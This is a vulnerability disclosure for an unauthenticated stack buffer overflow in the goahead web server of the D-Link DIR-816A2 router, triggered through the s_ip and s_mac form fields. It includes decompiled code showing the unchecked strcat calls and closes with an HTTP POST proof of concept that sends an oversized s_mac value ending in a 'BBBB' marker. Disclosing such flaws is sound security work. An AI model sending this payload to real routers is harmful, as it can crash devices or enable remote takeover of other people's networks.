# Buffer Overflow Vulnerability in `s_ip` and `s_mac`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-816A2 Router                                      |
| Firmware Version     | **DIR-816A2_FWv1.10CNB05_R1B011D88210.img** (other versions require verification) |
| Vulnerability Type   | **Stack Buffer Overflow**                                    |
| Vulnerable Component | `goahead` Web Server (DHCP static rule handling module)      |
| Prerequisites        | No authentication required (remote exploitation possible)    |

2. Exploitation Path

```c
// goahead
int __fastcall sub_42BC84(int a1)
{
  ...
  _BYTE v10[1024]; // [sp+18h] [-400h] BYREF

  memset(v10, 0, sizeof(v10));
  Var = (_BYTE *)websGetVar(a1, (int)"s_ip", (__int16)"");
  v3 = (_BYTE *)websGetVar(a1, (int)"s_mac", (__int16)"");
  v4 = 0;
  while ( 1 )
  {
    v5 = v4 < strlen(v3);
    v6 = &v3[v4++];
    if ( !v5 )
      break;
    while ( *v6 == 45 )
    {
      *v6 = 58;
      v7 = v4 < strlen(v3);
      v6 = &v3[v4++];
      if ( !v7 )
        goto LABEL_5;
    }
  }
LABEL_5:
  if ( !*Var || !*v3 )
    return websRedirect(a1, "lan.asp");
  v9 = nvram_bufget(0, "DhcpStaticRulesStr");
  strcpy(v10, v9);
  strcat(v10, v3);
  strcat(v10, " ");
  strcat(v10, Var);
  strcat(v10, "|");
  ...
}
```

3. **Vulnerable Binary:** `goahead`.

4. 0-Day Buffer Overflow Exploitation Path:

   - In `goahead`, line 9: `v3 = (_BYTE *)websGetVar(a1, (int)"s_mac", (__int16)"")` receives user input, which is concatenated without length validation at line 31: `strcat(v10, v3)`, resulting in a stack buffer overflow.

   - In `goahead`, line 8: `Var = (_BYTE *)websGetVar(a1, (int)"s_ip", (__int16)"")` receives user input, which is concatenated without length validation at line 33: `strcat(v10, Var)`, resulting in a stack buffer overflow.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /goform/lan HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded

s_mac=AA:AA:AA:AA:AA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&s_ip=127.0.0.1
```